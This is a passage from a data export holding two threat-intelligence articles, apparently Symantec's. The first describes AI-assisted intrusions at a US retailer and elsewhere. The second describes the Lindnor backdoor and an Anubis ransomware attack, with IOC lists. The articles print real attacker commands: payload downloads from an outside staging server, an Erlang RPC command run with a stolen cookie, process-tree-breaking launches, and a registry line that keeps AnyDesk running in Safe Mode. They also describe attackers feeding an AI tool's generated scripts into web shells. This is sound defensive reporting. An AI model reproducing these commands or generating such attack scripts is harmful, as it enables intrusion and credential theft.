+On September 23, the attackers executed around 50 long scripts over roughly two hours. The median script ran to more than 500 characters, over 10 times the length of the hand-typed commands. None of the scripts contained a typing error. Each submission bundled several probes, labelled each result with a banner such as ===FILES MENTIONING CONN STRINGS===, wrapped cmdlets in error handling and capped the amount of output returned. That layout suits a consumer reading results back through a narrow text channel, and it is a common pattern in code generated by large language models (LLMs).
+
+The strongest evidence of AI usage was in the comments. Several scripts opened with text that stated a hypothesis, cited earlier results and revised a previous conclusion before acting. One recorded that earlier negative results about a server had come from a SOCKS proxy channel known to report false successes, so the conclusion had to be re-measured from a host with a direct route. Human operators do not usually write that kind of deliberation into a one-shot web shell command.
+
+An operator in the loop, not an autonomous agent
+
+The gap between submissions never fell below seven seconds and longer pauses of two-to-eight minutes came before changes of strategy. There was no scanner-style burst activity and no fixed-interval beaconing. This is consistent with an operator copying output into an AI tool and pasting the next command into the web shell. Symantec assesses the AI assistance with high confidence and the operator-in-the-loop model with moderate confidence. The model or service involved could not be identified.
+
+Similar labelled scripts also appeared on September 18, 2026 on three database servers in the same network, so the web server was not the first place the attackers appeared to use AI. Comments disappeared from the data between September 19 and 22 and returned in a different style, which may mean that more than one AI model was in use.
+
+Tooling and tradecraft
+
+DLL sideloading
+
+The attackers downloaded an old, legitimate Bitdefender executable (bdreinit.exe) with a malicious DLL (log.dll) and a file named log.txt. The executable loads log.dll from its own folder, and the DLL reads and decrypts the text file, which holds the payload. The pairing has been documented in public reporting by Elastic and SecureWorks (now part of Sophos) on ShadowPad loaders. However, the bdreinit.exe and log.dll pairing has also been used by several threat actors in different operations, so it does not on its own identify the malware or the actor. A second set used a G DATA signed executable (ask.exe) with ask.dll and ask.txt.
+
+ShadowPad is a modular remote access Trojan (RAT) that is closely associated with China-based APT groups. It is associated with various threat groups, particularly the APT41-nexus groups such as Blackfly, Grayfly and Redfly. It was documented being used by Glowworm in 2024, which was the first time that group had been observed using the malware. It has more recently been used in attacks where ransomware has been deployed. Typically, ShadowPad is loaded onto victim networks via DLL sideloading. DLL sideloading is a technique where the attackers use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious DLL payload.
+
+Process-tree breaking
+
+After repeated terminations, the attackers deployed a utility called BreakChain, which relaunches a target so that it no longer appears as a child of the IIS worker process (w3wp.exe). It offers five launch modes and the attackers used two, the WMI and shell modes. About 75 minutes after the first build was blocked, the attackers deployed a second build.
+
+Yuze tunnelling tool
+
+In the August 2026 intrusion at a different organization, the attackers ran Yuze to connect back to 204.194.49[.]129, the same server later used to stage payloads against the retailer. Yuze is a lightweight, open-source tunnelling tool that supports forward and reverse SOCKS5 proxies. Trend Micro has documented its use by Warlock ransomware attackers, and Warlock is developed by a China-nexus actor Symantec tracks as Longlegs (aka Storm-2603). Because Yuze is publicly available, its presence is not enough on its own to tie this activity to Warlock or Longlegs.
+
+Attack chain: Intrusion against a U.S. retail organization
+
+The initial infection vector is unknown. The earliest malicious activity took place on September 18, 2026, on three servers within the same organization (Computer 1, Computer 2 and Computer 3), all running Microsoft SQL Server. On each, malicious commands were launched as cmd.exe running directly under sqlservr.exe, which indicates that they were issued through the database service itself, most likely via its xp_cmdshell feature.
+
+On Computer 2, the commands arrived as multi-part PowerShell scripts in which each section was introduced by a quoted text label, so that a single execution returned a structured report. This layout, together with the very short gaps between submissions, resembles output generated by an LLM rather than commands typed by hand, and it recurs throughout the intrusion.
+
+""### whoami/priv ###""whoami /priv""### cmdkey ###""cmdkey /list""### RMS service accounts ###""Get-CimInstance Win32_Service | Where-Object {$_.PathName -match 'RMS|Store|Dynamics'} | Select-Object Name,StartName,PathName | Format-List | Out-String
+
+Further scripts searched the point-of-sale synchronization directories for files containing credentials or connection strings. That the attackers went straight to these folders suggests that they had already identified the retail application. The scripts also tested whether the server could reach the internet by opening a TCP connection to 155.254.22[.]215 on port 9458. The attackers repeated this egress test on Computer 1 shortly afterwards.
+
+The attackers then built a privilege escalation tool directly on Computer 2. Around 20 consecutive PowerShell commands appended base64-encoded text to a file in a new folder under ProgramData, which was decoded with Certutil and compiled with the .NET C# compiler, csc.exe. The source was EfsPotato, a publicly available exploit that abuses the Windows Encrypting File System RPC interface to run commands as SYSTEM. The payload saved the SAM, SYSTEM and SECURITY registry hives, from which an attacker can extract local NTLM password hashes, cached domain credentials and LSA secrets.
+
+On September 21 a fourth computer (Computer 4), a Windows web server, appeared. Its malicious commands were launched as cmd.exe under w3wp.exe, which is characteristic of a compromised web application. A short burst of discovery was followed by a gap of about 12 hours.
+
+When activity resumed on September 22, the commands showed signs of typing by a person, including the mistyped “systemifo” and “pwoershell,”. The attackers used Invoke-WebRequest to pull bdreinit.exe, log.dll and log.txt from 204.194.49[.]129 on port 8080 into the ProgramData folder:
+
+powershell invoke-webrequest 204.194.49.129:8080/log.txt -OutFile CSIDL_COMMON_APPDATA\log.txtpowershell invoke-webrequest 204.194.49.129:8080/log.dll -OutFile CSIDL_COMMON_APPDATA\log.dllpowershell invoke-webrequest 204.194.49.129:8080/bdreinit.exe -OutFile CSIDL_COMMON_APPDATA\bdreinit.exe
+
+Security terminated bdreinit.exe each time, but the attackers launched it roughly five times in less than 20 minutes, directly, through cmd.exe and through PowerShell. They then downloaded a PowerShell script, server.ps1, first from 166.0.25[.]106 and then from 154.81.37[.]136, which indicates fallback infrastructure. The script was an AES-encrypted PowerShell reverse shell that connects back to 166.0.25[.]106 on port 443. For persistent access that did not depend on the original entry point, the attackers also wrote two ASP web shells (filemanager.asp and qwdajhsd.asp) into the web application's images folder.
+
+On September 23 the attackers returned to Computer 4, deleted the earlier files and staged a second side-loading set, ask.exe, ask.dll and ask.txt, launched with a -gdata argument. They also used an executable named mmc.exe, a name that mimics the Microsoft Management Console, as an intermediary to launch the others, presumably to change the parent process. After the launches were again terminated, they deleted the files and downloaded them once more. They then fetched a utility named BreakChainC.exe.
+
+Shortly afterwards, the commands changed character again. For nearly two hours they were long, multi-part PowerShell scripts, often only seconds apart, with no typing errors, and labelled sections such as: ===FILES MENTIONING CONN STRINGS===. Each appeared to build on the output of the one before it. The attackers collected credentials from the web server, including: connection strings; the FileZilla Server user database; FileZilla, WinSCP and PuTTY client settings; saved RDP files; IIS configuration, and Windows logon registry values.
+
+The attackers then turned to the server's monitoring software. They located the SolarWinds Orion installation, queried its local SQL Server instance for the table of monitored nodes, and read the Zabbix agent's pre-shared key. Using SQL logins and passwords that they already held, they connected to two remote SQL Servers and tested whether each login had the sysadmin role.
+
+The next step was lateral movement. The attackers identified the RabbitMQ message broker that ships with Orion and read its Erlang cookie file (.erlang.cookie): the shared secret that Erlang nodes use to authenticate to one another. They ran the erl.exe that Orion bundles, with the cookie, to call the RabbitMQ node on a second web server and run an operating system command. About 10 minutes had passed since they first queried the Orion service. The command was encoded as a list of decimal character codes, which does not appear in plain text in the command line:
+
+""CSIDL_PROGRAM_FILESX86\solarwinds\orion\erlang\erts-9.0\bin\erl.exe"" -noshell -sname <random> -setcookie [REMOVED] -eval ""io:put_chars(rpc:call('rabbit@<web server 2>',os,cmd,[[119,104,111,97,109,105]])),halt().""
+
+The first command decodes to whoami. Subsequent calls decode to registry queries against the SAM database, the SECURITY hive's cached-logon and LSA secrets locations, and the built-in Administrator account, which together hold password hashes, cached domain credentials and LSA secrets.
+
+Several of the scripts that followed opened with comments that stated a hypothesis, cited earlier results and revised a previous conclusion. This is unusual in commands and suggests that the reasoning of the tool generating them was being passed through with the code. The comments also refer to a SOCKS channel that the attackers were already using to reach the internal network; the telemetry does not show it being set up.
+
+# Re-measure <host A> from <host B>, which shares the /27 with it.# Every previous negative result about <host A> came from our SOCKS channel, and that# channel is known to fabricate success on <host A> (445/139) - and to 401 even with# valid SSPI. So the ""FTP anonymous off, 9 reused passwords failed"" verdict has# to be re-taken from a vantage point that actually routes to the host.
+
+Later that same day, the attackers fetched a second build of the process-tree-breaking utility, BreakChainCs.exe, and used its shell and WMI modes to launch bdreinit.exe and the ask.exe kit so that they no longer appeared as children of w3wp.exe. They also copied ask.exe to a file named w3wp.exe in ProgramData, matching the name of the IIS worker process.
+
+CSIDL_COMMON_APPDATA\breakchaincs.exe -m wmi ""CSIDL_COMMON_APPDATA\bdreinit.exe""cmd /c copy CSIDL_COMMON_APPDATA\ask.exe CSIDL_COMMON_APPDATA\w3wp.exe
+
+On September 24, a fifth computer (Computer 5), another SQL Server host, saved its SAM and SECURITY hives to a new folder under ProgramData. Activity resumed on a larger scale on September 25. On Computer 4, the security product detected a Chisel tunnelling tool, and the attackers ran a PowerShell download cradle to fetch a script, sqlrun2.ps1, from a new staging server at 108.165.20[.]205 on port 8080.
+
+Computer 2 was active again the same day, and its commands suggest that it is a domain controller. The attackers saved the registry hives again, searched the system drive for NTDS.dit, the Active Directory database that stores the password hashes for every domain account, and searched SYSVOL for Group Policy Preferences cpassword values and Active Directory for LAPS (Local Administrator Password Solution) passwords. They also tried a short list of candidate passwords for the sa account against several SQL Servers, and xp_cmdshell commands then ran against one of them, which indicates that one login succeeded.
+
+A sixth computer (Computer 6) joined the activity that afternoon, and the attackers scanned more than a dozen internal hosts for SQL Server, SMB, RDP and WinRM ports. On September 26 a seventh computer (Computer 7), running an older version of SQL Server, ran a password sprayer. It downloaded a list of credential pairs from the new staging server and tested each pair against a web service. Several file names in this incident begin with i followed by a number, such as i187_winspray.ps1, which may be a per-target numbering scheme in the attackers' tooling. Use of the sprayer on this computer continued until at least September 29.
+
+Significance
+
+The most important finding in this investigation is not a new technique. Erlang remote procedure calls, cookie theft and credential harvesting from configuration files are all long documented. What AI assistance appears to have changed is the speed and reliability with which the attackers applied them. Within about 10 minutes of discovering what software ran on the web server, the operators had identified an unfamiliar message broker, located its shared secret and used it to run commands on another host. The day before, the same operators with the same access had achieved little.
+
+The tooling suggests that AI was added to an existing toolkit rather than being its source. The same side-loading components and staging server appeared in an earlier intrusion in which Symantec found no signs of AI assistance. A separate report published on September 22, 2026 by Gambit Security described a financially motivated operator who ran open-source AI tools against online retailers, whose AI console loaded a Chinese-language persona titled “SOUL - Red Team Operator,” and listed 155.254.22[.]215 as its staging and command server and AI console. That is the address the attackers tested from the victim's servers on September 18, 2026. Taken together, the shared address, the focus on retailers, and the search for point-of-sale credentials suggest that the two operations may be linked, although the Gambit report does not mention the loaders described here. It does describe an instruction to wipe card data after extraction, but we saw no destructive activity in this intrusion.
+
+Other AI-assisted attacks
+
+This attack was one of dozens of AI-assisted attacks Threat Hunter has investigated in recent months. Several further cases remain under investigation.
+
+The pace of these attacks increased as the quarter went on, with the majority of attacks occurring in September. Brief outlines of some of these attacks are below.
+
+University web server in Vietnam
+
+In June 2026, attackers deployed a web shell on a university web server in Vietnam and altered the site's configuration so that a malicious component would load with it. They also overwrote some of its core files and changed file dates to cover their tracks. They next made six failed attempts to download PrintSpoofer, a public tool that gives attackers full control of a Windows machine. When direct downloads failed, they smuggled the tool in as text and rebuilt it on the server.
+
+The aim of the attack seems to have been to take full control of the server and keep that access. Attacker commands ran about a second apart, and the first sessions were separated by almost exactly three and 12 hours, which points to automation. One of the clearest signs of AI usage was a script that contained numbered notes in Chinese addressed to the operator, including a suggestion to focus on a particular directory because of a username found earlier. That read like a chat assistant's reply pasted straight into the attack.
+
+ICT provider in East Africa
+
+In late August 2026, attackers spent about 61 hours inside the network of a technology provider that serves banks and telecoms in East Africa. They ran commands through both a web shell and the company's database service, set up tunnels to route their traffic, prepared a dump of stored login credentials in a web folder and used a built-in Windows tool to copy the Active Directory database, which holds password hashes for every account. They also searched files for mobile-money terms, such as M-Pesa, and for payment keys and callback addresses. This suggests they were after the credentials that connect the company's systems to mobile payment services.
+
+For one period, the nature of the attacker commands changed in the same way as described above in our account of the attack on the U.S. retail organization. The attackers submitted 212 long scripts, averaging about 1,000 characters, with explanatory comments, tidy labelled output and no typing errors. One script built a list of likely passwords from the names of the company's applications, which it had found earlier, and another built a low-level network query by hand that worked the first time. In the later hands-on phases, five commands in a row failed with simple mistakes. The AI added no new technique, but it let the attackers apply known ones quickly and accurately.
+
+Government hydroelectric company in a south Asian country
+
+In August 2026, attackers deployed a PHP web shell on a Windows server belonging to a hydroelectric power company in a south Asian country. After some hand-typed reconnaissance on August 13, they switched to PowerShell scripts that tried four sets of credentials against several databases, pulled rows from tables that held passwords, checked whether the account had administrator rights (using obfuscated queries) and whether it could run commands through the database, and then tried to run a command on a second server.
+
+The goal appears to have been to harvest passwords and move laterally to other systems. The scripts had section headings, neat error reports and trimmed output, which is typical of AI-written code. One still contained the placeholder YOUR_IP where an attacker's server address should have been, which suggests the generated script was pasted in without being edited.
+
+Web hosting server in a south Asian country
+
+In July 2026, attackers used a web shell on a shared web hosting server in a south Asian country. They worked in four bursts about three hours apart, running roughly 970 commands about one second apart with no typing errors, which points to automated or AI-driven activity.
+
+They took database passwords from the sites' configuration files, logged in to a remote database server that held about 20 databases, including tables of cryptocurrency wallets, money transfers and payouts, and created scheduled tasks with names designed to look like system health checks. They also tried to take full control of the server using a public exploit for a 2022 Windows vulnerability (CVE-2022-21882).
+
+When security software blocked the download, they retried in five different ways within about 90 seconds. The wallet and payout tables suggest that the attackers were financially motivated.
+
+Linked cases in south Asia
+
+Three more attacks, at organizations that appear to be in south Asia, shared tools, infrastructure or both. At the first organization, on September 20, 2026, attackers spent about two hours on a compromised web server testing which methods would let them download and run code and marked each success with a short word such as PSOK or MSHTAOK. They then downloaded a malicious program disguised as a Windows system file (svchost.exe) from a web domain. Over four days of sessions, from September 18 to 22, they also shut down security software, raised their privileges and set up daily persistence.
+
+An attack on a second organization used a staging server and download domain that were also used in the first attack. Two web servers were compromised, with marker words such as WEBSHELL_OK, showing which steps had worked. On one machine the attackers ran 290 commands in 28 minutes, with 44 percent of the gaps between them a second or less. When a privilege escalation tool was blocked, they rebuilt it on the machine within about 10 minutes. They installed a custom backdoor program as a Windows service on one server and hid another inside an application folder on the other. The aim in both cases appears to have been lasting, high-level control of the servers, but the motive is unclear.
+
+At the third organization, the earliest activity, on September 2, came through the SQL Server database service. The attackers set up scheduled tasks to keep their access, copied the system's stored password data, and created a hidden tunnel using a Tailscale-like tool that they renamed after security software blocked it. They then sprayed passwords against an external database server and stole a spreadsheet whose name suggests it held application security details, by encoding it and printing it out in chunks.
+
+The commands ran about a second apart in sessions roughly three hours apart, with labelled sections and numbered scripts, and the access was still active in early October. The motive for these attacks is unclear.
+
+Common trends
+
+Many cases followed a similar sequence: command execution through a web shell or SQL Server, a privilege escalation tool from the Potato family such as PrintSpoofer, GodPotato or EfsPotato, registry hive dumps and, in some, a tunnelling tool such as Chisel. In all cases, AI supplied no new techniques or tactics, only a new way of meeting objectives.
+
+AI increased the speed and persistence of the attacks. After a block, attackers renamed or rebuilt their tools within seconds or minutes. One rebuilt an exploit in about 10 minutes, another swapped tool and file names within about 10 seconds of a block, and in the retail attack the second build of the process-tree-breaking tool arrived about 75 minutes after the first was blocked.
+
+The degree of human involvement varied. In the retail attack, the gap between scripts never fell below seven seconds, which suggested an operator relaying output between an AI tool and the web shell. Several other attacks showed median gaps of about one second and sessions that recurred about every three hours, which look more like automation. In most cases, the evidence could not show whether an operator was in the loop.
+
+Protection
+
+For the latest protection updates, please visit the Symantec Protection Bulletin.
+
+If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.
+
+Indicators of Compromise
+
+File indicators
+
+54fb493822bcd832f7b2256015f13e3dfde815e1931e7fd39a90ea8ad3fdbd0a – server.ps1 (AES–encrypted PowerShell reverse shell)
+
+a6579b16f895cf9ac4c31ba20606f2ad1ac4d1458e95c296da2afc1039881513 – bdreinit.exe (Legitimate Bitdefender executable used for side–loading)
+
+9c866c403e6bd5778fa3788cac9aac39aab1bf2d18a22c9999a4c27e30c0abf3 – log.dll (Malicious DLL)
+
+e95a265bf220a4330f77f842b3eeed8b1ed8c61f51d7e3f2fd33bac14b6b26af – log.dll (Malicious DLL)
+
+c21e4fb40f871e418def63a5cdf3603ed4c3c6d1b218710db8ba45538b66fa01 – Malicious DLL
+
+6500890307f3860899f96452fea3effde777e6fcf369dc1e8861bdb65836d55e – ask.exe (Legitimate G DATA signed executable used for side–loading)
+
+7265d69dd8d8939dc888ce5f05190ce200ee2660f928f3b84f60e6a7b3383205 – ask.dll (Malicious DLL)
+
+3d79628bf7804dbf17e7b396ecd62ebf5d66518940c6d23daccf59a20953438a – BreakChainCs.exe (Process-tree-breaking launcher)
+
+f042d705e1de3b5f9b8161ff59aa3ff80c684f5aaeac42be589a579ab1c7cf51 – BreakChain launcher
+
+5db5e7f655c4ee94411df8110d1b6d02bb15574ac199fa7a553ce6c3cb25bf03 – ch.exe (Chisel tunnelling tool)
+
+f8b67854d119da08c704b78f7c9fae0501417f5e63ffece86d2e811f1c7dea68 – Yuze reverse proxy
+
+ef7c23619cf9293002fbe4f50147e806de0168cf186ca01fea2e113dc2eb1dce – DNS–over–HTTPS backdoor
+
+b739635832c7f7f2be4821982980d2977165a2c8226f5912e6431db8c0cf6eea – DNS–over–HTTPS backdoor
+
+0241f569f4ce1bf0f2470867d6ba40f23f78d4d3ee2fbc423c91f3b591f446bc – DNS–over–HTTPS backdoor
+
+c9a5e9799f2844a71d0085697b3c2adb5528f4b9516146826193ddbe4d89423c – Privilege escalation tool
+
+fad5dc8987df3206fdc50d0f4889bee06721d54a373bdc2f5545ba560562647e – Privilege escalation tool
+
+2b7ed8dc34a83430029764d64f81c8f42e19c81fe923742558c96799a34dcf19 – Sandbox–evasion test utility
+
+7c8eb7d23337536ed2aec14f1425c2fcd13976a4390cfecf653533e6a3bd87c4 – test.ps1 (Seen in an earlier intrusion at a different organization)
+
+7e866f007b8e42b0888c922c290c92d4f5f285089865a8e62788a9b4409e2bcf – rollback.exe (Seen in an earlier intrusion at a different organization)
+
+935c1861df1f4018d698e8b65abfa02d7e9037d8f68ca3c2065b6ca165d44ad2 – Suspicious file
+
+ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436 – Suspicious file
+
+deabe064a12641c4e95d4b133746f148d8ed4bcffd1dfe9ce1b6621dde2aa774 – Suspicious file
+
+d92f20d73ade9a6134bec960aed0c02873e19cd03d707c85064c73ce0f852104 – Suspicious file
+
+bcccfca65602e2691e25e8590a7029fa40712e05eac8bf203f3f5dc900b31ad4 – Suspicious file
+
+9b077fc464d9a4a2e6b227e61eae8a759de13b728e7cd2f06563a1af0de93d19 – Suspicious file
+
+59e51c54cf3ac4d375de96a358c15bc125fe5453ee29cf923276c429097b9eac – Suspicious file
+
+330e9314bd39898984e52e2e3cc01e84c9c4c95f5bc467cf5bc75cd539dd0438 – Suspicious file
+
+2be9c2222cb177747f58f2ccb224a85879f1c2ffb0240e0b8968536d320b8edf – Suspicious file
+
+1df54c1c5ee76f2f8f962963df3962f1a688806631da01d0e5ce85b817a5e2f7 – Suspicious file
+
+11b26168927a622ddc3beb592edc3bf476b897a360cbab36ad3ef0039068dd67 – Suspicious file
+
+1f8565e14f8bcde3eb48a6676596d0cd8b7cc3c12d903f97b0e0b3ac8725c17c – Suspicious file
+
+d376e01930adabbe40634b8b16664a088d8bec2dc99aa88c16db9d302e45aaf5 – Suspicious file
+
+642ea33ddf7eba3043cf7b567ccffe57d6671f640e7734072f02975dfa44d893 – Suspicious file
+
+5ee783076e9c8b3830d8e2dccda9abf65be81a0b8dfc281ff12188f7607f1d38 – Suspicious file
+
+dac237636f2fb1e44e28117999e77fc42a53d3b59b80cfb84928452ffe561793 – Suspicious file
+
+76adf3141ccd877d98c85dbb7f6f227e70f71e8158392ac9797927260dd2faa3 – Suspicious file
+
+5666332a66b1fb46bfbc7e076b21a8081f22931f5688686550d42bcec6aa3207 – Suspicious file
+
+2ffe8c6910d08072ccb8fef133a4570c6a085289b669373b1b508bd294fe9b23 – Suspicious file
+
+717319bc981c2b8f76907e2985f363540cb286f68aff0c75a5841eec2d0c9b04 – Suspicious file
+
+7e9b60d021067dfe22b28783162ce9f55c2ccce7d221cadbf1f0f155dca6779e – Suspicious file
+
+9b7b2dadba43634e8f6b38f612287865800b6c790e83a69211da55434c26a74a – Suspicious file
+
+318ce2ca913ff8297f23886a6d6640f28f63ba2bb62c0c6897972265d71e1407 – Suspicious file
+
+Network IOCs
+
+204[.]194[.]49[.]129 – Payload staging server (Port 8080)
+
+166[.]0[.]25[.]106 – server.ps1 and filemanager.asp host; C2 (Port 443)
+
+154[.]81[.]37[.]136 – server.ps1 host
+
+155[.]254[.]22[.]215 – Egress test target; named as an AI console in public reporting
+
+108[.]165[.]20[.]205 – Later staging server (port 8080)
+
+103[.]142[.]103[.]225 – Seen in an earlier intrusion at a different organization
+
+176[.]97[.]117[.]157
+
+103[.]79[.]79[.]191 – Yuze cluster
+
+103[.]79[.]79[.]120 – Yuze cluster (port 8088)
+
+8[.]219[.]82[.]21 – Yuze cluster
+
+43[.]208[.]224[.]101 – Yuze cluster
+
+hxxp://154[.]81[.]37[.]136/server.ps1
+
+hxxp://166[.]0[.]25[.]106/server.ps1
+
+hxxp://166[.]0[.]25[.]106/filemanager.asp
+
+hxxp://204[.]194[.]49[.]129:8080/log.dll
+
+hxxp://204[.]194[.]49[.]129:8080/log.txt
+
+hxxp://204[.]194[.]49[.]129:8080/bdreinit.exe
+
+hxxp://204[.]194[.]49[.]129:8080/ASK.exe
+
+hxxp://204[.]194[.]49[.]129:8080/qwdajhsd.asp
+
+hxxp://108[.]165[.]20[.]205:8080/sqlrun2.ps1
+
+hxxp://103[.]79[.]79[.]191/yuze
+
+hxxp://8[.]219[.]82[.]21/yuze–Windows–X64.exe"
+3ac1190349ae,3ac1190349ae,2026-11-05 11:00 UTC,"Attacks, Breaches & Threat Intel",Broadcom / Symantec,Broadcom/Symantec Blog,Endpoint Security; Server & Workload Protection; Threat Intelligence; Network Security,Article,New Lindnor Backdoor and Glut of Security Killers Used in Ransomware Attack on U.S. Org,https://www.security.com/threat-intelligence/lindnor-new-backdoor-anubis-ransomware,"The first indicator of the intrusion was the detection of the new Lindnor backdoor, which was found on two machines that were also the only two Microsoft SQL Servers among those...","Key findings
+
+Attackers using the Anubis ransomware targeted a U.S. organization in October 2026 using a new custom backdoor that Symantec has called Backdoor.Lindnor.
+
+The backdoor masqueraded as a Chrome component and as a VMware file, and was found on two Microsoft SQL Server machines.
+
+Within roughly an hour, the attackers dropped at least 13 executables to help terminate security services, along with five publicly known vulnerable drivers.
+
+The attackers also installed the legitimate remote access tool AnyDesk and a separate tool to run it in Safe Mode, likely to maintain access when security software was not fully running.
+
+The file encryption payload was blocked from execution, and there’s no evidence that any files were encrypted.
+
+Anubis has claimed approximately 96 victims in the past 12 months, and 52% of those victims are in the U.S.
+
+Overview
+
+Attackers using the Anubis ransomware, which is developed by a group Symantec tracks as Hawkmoth, deployed a previously undocumented custom backdoor and an unusually large number of security software-disabling tools in an October 2026 attack on an organization in the U.S.
+
+Hawkmoth runs a ransomware-as-a-service (RaaS) operation that emerged in December 2024 as a rebrand of the Sphinx ransomware. Its payload appears to be largely unchanged from the Sphinx version, with only the branding updated. As Hawkmoth operates an affiliate program, Anubis attacks may be carried out by different groups of affiliates. Attackers using it seem to be particularly tenacious. In a July 2026 Anubis attack documented by Symantec, we noted that the threat actor used four different exfiltration tools (Megasync, WinSCP, Filezilla, S3browser) to steal data from the affected network and that it was unusual to see that many of the same type of tool deployed in a single attack.
+
+The group has claimed approximately 96 victims in the past 12 months, and the majority of them (52%) are located in the U.S., which aligns with previous targeting patterns by the group.
+
+We did not identify how the attackers gained initial access. The first indicator of the intrusion was the detection of the new Lindnor backdoor, which was found on two machines that were also the only two Microsoft SQL Servers among those affected.
+
+Tooling and tradecraft
+
+Custom backdoor
+
+The backdoor, called Backdoor.Lindnor, was installed with the filename healthcontroller64.exe in a folder made to resemble a Chrome component unpacker directory on one machine, and as svchelper.exe in a VMware folder on the other. In both cases, the backdoor appears to have run as a service.
+
+The backdoor sent the process ID, operating system version, its own file path, computer name, user name, domain and logon server to a command-and-control (C&C) server. It was configured with a primary C&C server and a fallback, which are both accessed via port 443.
+
+The presence of this backdoor is notable as custom backdoors remain relatively uncommon in ransomware attacks. Ransomware attackers generally rely on publicly available, dual-use and living-off-the-land tools to carry out the majority of pre-ransomware activity in their attacks. This backdoor was also spotted on the networks of two other unrelated organizations, though in those cases no ransomware activity was identified on the networks.
+
+Security evasion tools
+
+A notable aspect of this attack was that the threat actors dropped at least 13 executables in quick succession, for the purpose of terminating security products. They clearly favored the Bring Your Own Vulnerable Driver (BYOVD) approach, as demonstrated by their dropping of five signed but vulnerable drivers for the purpose of abusing them to gain kernel-level access. Two of the executables, gbbsym.exe and symgooq.exe, masqueraded as Symantec software. Both accepted the switch (-l) to list kernel callbacks through a loaded vulnerable driver and a second switch (-d) to list and remove them. The observed command lines show the second switch (-d) was used. Eleven of the 13 executables appear to have been previously unpublished. The vulnerable drivers were all publicly known.
+
+All the dropped executables were blocked except huntreagent.exe and s1.exe. These files were not available for analysis so their exact purpose is unknown, but it is possible they may have been used to run one or more of the vulnerable drivers. Both tools are the same file size but with different file hashes, which suggests they may be two builds of the same tool. The pattern of using so many different tools is consistent with attackers trying one tool after another until they find something that works.
+
+The attackers’ heavy reliance on BYOVD serves to highlight how the technique has become a standard part of the ransomware playbook, a trend we discussed in-depth in our June 2026 whitepaper: Lights Out: Defense Evasion in the Age of BYOVD.
+
+BYOVD is commonly used to gain kernel-level access because it is effective and relies on using legitimate, signed files, the presence of which are unlikely to raise red flags. Once operating in the kernel, attackers can use them to help stop security software and prevent their activities from being detected. There are hundreds of known vulnerable drivers already in circulation and newly discovered ones are shared openly on a regular basis. Ready-made BYOVD tooling is now routinely bundled into RaaS offerings alongside the payloads themselves, making it a standard way to disable security software during ransomware attacks.
+
+Remote access and Safe Mode
+
+The attackers also installed the legitimate remote access tool AnyDesk, created a new local user account and added it to a local group. AnyDesk is frequently used by ransomware attackers for remote access. However, in this attack, the threat actors also ran a tool, safemode.exe, that configures AnyDesk to keep working when Windows boots into Safe Mode. They ran a registry command that registered AnyDesk as a service permitted to run in Safe Mode with Networking.
+
+""CSIDL_SYSTEM\reg.exe"" add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDesk /ve /t REG_SZ /d Service /f
+
+Security software generally does not fully operate in Safe Mode, which gives attackers a window to use the vulnerable drivers and switch off protections. This isn’t a new technique but it is not commonly seen.
+
+Ransomware payload
+
+The Anubis encryption payload was named iservice.exe. If successful, it appends the extension .anubis to encrypted files and drops ransom notes named restore files.txt and restore files.html. The note tells the victim that data was downloaded from the network and that it will be published if negotiations fail. The ransomware also has an optional wiper mode that wipes file contents, leaving files completely empty. In this attack, the payload was blocked, preventing the attackers from executing the encryption phase across the victim network.
+
+Significance
+
+Attackers using the Anubis ransomware appear to focus their attacks on the U.S., and this intrusion fits with established patterns of behavior by the group. This targeting isn’t surprising given that ransomware attackers generally “follow the money” and a majority of large enterprises have a presence in the U.S.
+
+While the overall modus operandi of the attackers is familiar, the presence of a custom backdoor and usage of large numbers of security-disabling tools makes this attack stand out from typical ransomware intrusions. Few ransomware operators build their own backdoors, and the volume of security-disabling tools used within a single hour of activity is unusual.
+
+This suggests that the attackers were prepared for the prospect of security software getting in their way, so they arrived with a large toolbox and a second remote access route configured for Safe Mode operation to help them gain an advantage. Despite all this preparation, the attack appears to have largely failed at the last hurdle because the encryption modules were successfully blocked from execution.
+
+Protection
+
+If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.
+
+Indicators of Compromise
+
+File indicators
+
+fc200686175559f4544a5de826905f09a68476d889690a3be40ac32356790cb8 – healthcontroller64.exe, svchelper.exe (Backdoor.Lindnor)
+
+5d2dd9caf2ae4a5083dbec16e688040456cdbc31eaeecbab78188e322ed0415b – powerhost.exe, eventwatcher.exe (Backdoor.Lindnor)
+
+ad9575a9ef2dcc9d2fd2a24376c418549d4b3db5564c22b20081d33cf7629e43 – volumeproxy.exe (Backdoor.Lindnor)
+
+e69b882218fa2a19fd351741874bfcd10a6ae91076e6a8483795e0e357f8d026 – iservice.exe (Anubis ransomware)
+
+467d1395b61d4b886329571b564fb21db01639acd2799439646c85b9aeaec175 – anydesk.exe
+
+47a864736764112d7897c76e56d51111ce75b3e46fdbac6933df8a5b29507d17 – safemode.exe
+
+6543ee9f89d80b2bcf08e98fb8e9e73a4b144a93c7b2a3f28e35de8f7e7a8a80 – bdr.exe
+
+83eff3e51b69968a4ddd503b0b1dccfa8829d638f2dc00cc69640a29aea814f1 – hwaudioch.exe
+
+f8d4142a94269b4258f370ef2292d22a49cd6dee8266a7122f4531e9cc5d9a2f – gibformin.exe
+
+cd1e68583b8b984a9bb5b9f7067077c0e0d8f79da4455c326319e5e5fc6e9c5f – test.exe
+
+5a2082162852984ffe7e7c501faa6cf473129fcba29406ffb98d55198de4b3a5 – xs.scr
+
+5fcd2c954764ac0888c8ba72fc1cf54db64e8f23f83aeb0786ae5b80438ba926 – gibfor.exe
+
+aa779d811e00a30dfb56b994bdd63424cbf97617af737a218b6aff9f7c3a50f5 – gbbsym.exe
+
+854c3e76beb200243ccf6af260e9a2089c2fc545f8f1b34d34c6fe86f2d056c3 – symgooq.exe
+
+67dee1d52189460b88f8ce5ffa76a5c22f86ffd67f8e689118019fce0863c321 – g.exe
+
+cde8dbeaf15250337a03e07a7e257b12b03e5e951885cc69a578545f44425bdd – backup.exe
+
+28357d9666a9be36b2ea9ac6007bb8bfbe7e2438e095c1ec40720c4001f47c62 – rustr.exe
+
+588887e709459f1d1a8109b089cb3462c6f796d30b6297a1a0fdb3419a3ccbce – huntreagent.exe
+
+962be6983f3ed4f1dc4ce117e135cc0a5ab8fc6b5f5aa0284eff8a9def66e338 – s1.exe
+
